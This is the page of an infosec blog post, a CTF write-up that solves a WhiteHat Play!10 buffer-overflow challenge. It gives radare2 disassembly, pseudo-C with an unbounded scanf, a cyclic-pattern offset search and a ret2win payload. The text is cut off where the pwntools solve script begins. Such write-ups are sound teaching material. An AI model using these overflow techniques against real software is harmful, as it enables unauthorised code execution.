<!DOCTYPE html>







<html lang="en"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    <!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now">

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="PWN Journey: Part 2" />
<meta name="author" content="The Archivist" />
<meta property="og:locale" content="en" />
<meta name="description" content="In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each." />
<meta property="og:description" content="In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each." />
<link rel="canonical" href="http://localhost:4000/blog/en/posts/pwns-2/" />
<meta property="og:url" content="http://localhost:4000/blog/en/posts/pwns-2/" />
<meta property="og:site_name" content="Another infosec blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-12-20T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="PWN Journey: Part 2" />
<meta name="twitter:site" content="@0x7c00" />
<meta name="twitter:creator" content="@The Archivist" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"PWN Journey: Part 2","url":"http://localhost:4000/blog/en/posts/pwns-2/","dateModified":"2021-12-20T00:00:00+08:00","datePublished":"2021-12-20T00:00:00+08:00","author":{"@type":"Person","name":"The Archivist"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/en/posts/pwns-2/"},"description":"In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>PWN Journey: Part 2 | Another infosec blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/blog/en/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/blog/en/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/blog/en/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/blog/en/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/blog/en/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Another infosec blog">
<meta name="application-name" content="Another infosec blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/blog/en/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/blog/en/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  

  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/blog/en/" alt="avatar" class="mx-auto">
        
          
          <img src="/blog/en/assets/img/avatar.gif" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/blog/en/">Another infosec blog</a>
    </div>
    <div class="site-subtitle font-italic">Where one's enthusiasm provides knowledge and comprehension for others.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/blog/en/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/blog/en/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/blog/en/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/legiahuyy" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/0x7c00" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['legiahuy420','gmail.com'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/blog/en/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/blog/en/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>PWN Journey: Part 2</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        



<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
    
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- images -->



  <!-- add CDN prefix if it exists -->

  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

  

  <!-- add image placehoder to prevent layout reflow -->

  

  

  
    
      
      
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    

    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    
      

      
      

      
      

      

    

    

  

  
  

  

  
  

  




<!-- return -->







<h1 data-toc-skip>PWN Journey: Part 2</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>
    
    

    

    
    <em>
      
        <a href="https://twitter.com/0x7c00">The Archivist</a>
      
    </em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago"
    date="2021-12-20 00:00:00 +0800"
    
      data-toggle="tooltip"
      data-placement="bottom"
      title="Mon, Dec 20, 2021, 12:00 AM +0800"
    >Dec 20, 2021</em>

      </span>

      <!-- lastmod date -->
      
      <span>
        Updated
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->





<em class="timeago"
    date="2021-12-20"
    
      data-toggle="tooltip"
      data-placement="bottom"
      title="Mon, Dec 20, 2021, 12:00 AM +0000"
    >Dec 20, 2021</em>

      </span>
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="4848 words">
  <em>26 min</em> read</span>


      <!-- page views -->
      
    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>In this post, we will solve two pwn challenges from WhiteHat Play!10 and a customized one. We will also delve into details about most frequently encountered protection bits as well as bypass method for each.</p>

<!--[READMORE]-->

<p>Anyway, I hope you have a good time reading.</p>

<h1 id="whitehat-play10---pwn01">WhiteHat Play!10 - pwn01</h1>

<p><strong>Goal:</strong> Trigger the buffer overflow and call <code class="language-plaintext highlighter-rouge">covid19</code>.</p>

<p>This is an original pwn challenge from WhiteHat Play10! Wargame and you can download it <a href="https://drive.google.com/file/d/1sHGwTRkcGEqCxas8SqCoVt-P6FV-468B/view">here</a> or use this <a href="https://github.com/legiahuyy/dropper/blob/main/whitehat10/pwn/easybof">mirror link</a>.</p>

<h2 id="fingerprinting">Fingerprinting<a href="#fingerprinting"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Initially, we want to know what type of the binary we are going to analyze and we will have <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">radare2</code> to determine its properties.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_10-10.png" alt="" /></p>

<p>A 64-bit ELF with NX bit enabled.</p>

<p>The challenge, of course, does not provide us with its original source code. Here is a list of functions and their disassembled-views.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_12-33.png" alt="" /></p>

<p>At <code class="language-plaintext highlighter-rouge">0x004011d9</code> - <code class="language-plaintext highlighter-rouge">main</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre>[0x7f1963069050]&gt; s main;pdf
            ; DATA XREF from entry0 @ 0x4010f1
┌ 221: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_120h @ rbp-0x120
│           ; var int64_t var_114h @ rbp-0x114
│           ; var int64_t var_110h @ rbp-0x110
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x004011d9      f30f1efa       endbr64
│           0x004011dd      55             push rbp
│           0x004011de      4889e5         mov rbp, rsp
│           0x004011e1      4881ec200100.  sub rsp, 0x120
│           0x004011e8      89bdecfeffff   mov dword [var_114h], edi   ; argc
│           0x004011ee      4889b5e0feff.  mov qword [var_120h], rsi   ; argv
│           0x004011f5      488b05342e00.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x404030:8]=0                                                
│           0x004011fc      b900000000     mov ecx, 0
│           0x00401201      ba02000000     mov edx, 2
│           0x00401206      be00000000     mov esi, 0
│           0x0040120b      4889c7         mov rdi, rax
│           0x0040120e      e89dfeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x00401213      488b05062e00.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│                                                                      ; [0x404020:8]=0                                                
│           0x0040121a      b900000000     mov ecx, 0
│           0x0040121f      ba02000000     mov edx, 2
│           0x00401224      be00000000     mov esi, 0
│           0x00401229      4889c7         mov rdi, rax
│           0x0040122c      e87ffeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x00401231      488b05082e00.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
│                                                                      ; [0x404040:8]=0                                                
│           0x00401238      b900000000     mov ecx, 0
│           0x0040123d      ba02000000     mov edx, 2
│           0x00401242      be00000000     mov esi, 0
│           0x00401247      4889c7         mov rdi, rax
│           0x0040124a      e861feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x0040124f      488d3dda0d00.  lea rdi, str.You_can_find_the_key_to_save_humanity_from_the_COVID_19_pandemic ; 0x402030 ; "You can find the key to save humanity from the COVID-19 pandemic"                                                                      
│           0x00401256      e825feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040125b      488d3d0f0e00.  lea rdi, str.Here_is_your_chance:_ ; 0x402071 ; "Here is your chance: "
│           0x00401262      e819feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00401267      488d85f0feff.  lea rax, [var_110h]
│           0x0040126e      4889c6         mov rsi, rax
│           0x00401271      488d3d0f0e00.  lea rdi, [0x00402087]       ; "%s"
│           0x00401278      b800000000     mov eax, 0
│           0x0040127d      e83efeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00401282      488d85f0feff.  lea rax, [var_110h]
│           0x00401289      4889c7         mov rdi, rax
│           0x0040128c      e8fffdffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00401291      8945fc         mov dword [var_4h], eax
│           0x00401294      488d85f0feff.  lea rax, [var_110h]
│           0x0040129b      4889c7         mov rdi, rax
│           0x0040129e      e8ddfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012a3      488d3de00d00.  lea rdi, str.No_please_try_again____ ; 0x40208a ; "No,please try again!!!!"
│           0x004012aa      e8d1fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004012af      b800000000     mov eax, 0
│           0x004012b4      c9             leave
└           0x004012b5      c3             ret
</pre></td></tr></tbody></table></code></div></div>

<p>and at <code class="language-plaintext highlighter-rouge">0x004011b6</code>, we have <code class="language-plaintext highlighter-rouge">covid19</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>[0x004011d9]&gt; s sym.covid19 ;pdf
┌ 35: sym.covid19 ();
│           0x004011b6      f30f1efa       endbr64
│           0x004011ba      55             push rbp
│           0x004011bb      4889e5         mov rbp, rsp
│           0x004011be      488d3d430e00.  lea rdi, str.Congratulations_ ; 0x402008 ; "Congratulations!"
│           0x004011c5      e8b6feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011ca      488d3d480e00.  lea rdi, str.cat__home_easybof_flag ; 0x402019 ; "cat /home/easybof/flag"
│           0x004011d1      e8cafeffff     call sym.imp.system         ; int system(const char *string)
│           0x004011d6      90             nop
│           0x004011d7      5d             pop rbp
└           0x004011d8      c3             ret
</pre></td></tr></tbody></table></code></div></div>

<p>If you have a difficult time understand this low-level language, try to get the gist and look at their roughly equivalent pseudo-c as follows:</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x110</span><span class="p">];</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"You can find the key to save humanity from the COVID-19 pandemic"</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"Here is your chance: "</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
	<span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"No,please try again!!!!"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">covid19</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"Congratulations!"</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"cat /home/easybof/flag"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="code-breakdown">Code breakdown<a href="#code-breakdown"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>There are two functions, <code class="language-plaintext highlighter-rouge">main</code> and <code class="language-plaintext highlighter-rouge">covid19</code>.</p>

<p><code class="language-plaintext highlighter-rouge">main</code> creates a presumable buffer of <code class="language-plaintext highlighter-rouge">0x110</code> bytes in size and <code class="language-plaintext highlighter-rouge">covid19</code> merely prints <code class="language-plaintext highlighter-rouge">Congratulations!</code> then calls <code class="language-plaintext highlighter-rouge">system</code> to read the flag at <code class="language-plaintext highlighter-rouge">/home/easybof/flag</code>.</p>

<h2 id="solution">Solution<a href="#solution"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>As <code class="language-plaintext highlighter-rouge">scanf</code> has no boundary check, it provides a buffer overflow opportunity for us to exploit. We thus have to determine the padding length between the buffer and our RIP, thereby making it point to the address of <code class="language-plaintext highlighter-rouge">covid19</code>.</p>

<p>Hence, our <em>ret2win</em> skeleton payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = PAD_TIL_RIP (??) + covid19_ADDR (??)
</pre></td></tr></tbody></table></code></div></div>

<p>In order to find the <code class="language-plaintext highlighter-rouge">PAD_TIL_RIP</code> variable, as you may or may not have already known from my previous post, we mentioned a sequence called De Bruijn Sequence that can evaluate the distance between the start offset of our buffer and RIP.</p>

<p>And make sure your sequence has the length of <code class="language-plaintext highlighter-rouge">buffer_size + 4n</code>, keep increase until a SIGSEGV (code=1) occurs. In this case, I will have <a href="https://r2wiki.readthedocs.io/en/latest/tools/ragg2/">ragg2</a> to generate a sequence of 284 characters</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>┌──<span class="o">(</span>legiahuyy㉿kali<span class="o">)</span>-[~/…/Study/PWN/WhiteHatWargame/pwn1_c15747119b]
└─<span class="nv">$ </span>ragg2 <span class="nt">-P</span> 280 <span class="nt">-r</span>
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABg
</pre></td></tr></tbody></table></code></div></div>

<p>then feed it to the program and successfully be able to control the RIP.</p>

<p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2021-12-20_16-53.png" alt="" /></p>

<p>So, our <code class="language-plaintext highlighter-rouge">PAD_TIL_RIP</code> would be 280.</p>

<p>The last variable is <code class="language-plaintext highlighter-rouge">covid19_ADDR</code>, which we can get with <code class="language-plaintext highlighter-rouge">afl~covid19</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>[0x7f0041684241]&gt; afl~covid19
0x004011b6    1 35           sym.covid19
[0x7f0041684241]&gt; 
</pre></td></tr></tbody></table></code></div></div>

<p>And our final payload is:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>payload = PAD_TIL_RIP (280) + covid19_ADDR (0x004011b6)
</pre></td></tr></tbody></table></code></div></div>

<h2 id="solvepy">SOLVE.py<a href="#solvepy"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Now, we already have everything needed for the script but unfortunately, I could not connect to the wargame server as it ended a month ago, so I created a fake flag locate exactly at <code class="language-plaintext highlighter-rouge">/home/easybof/flag</code>.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./easybof'</span><span class="p">)</span>
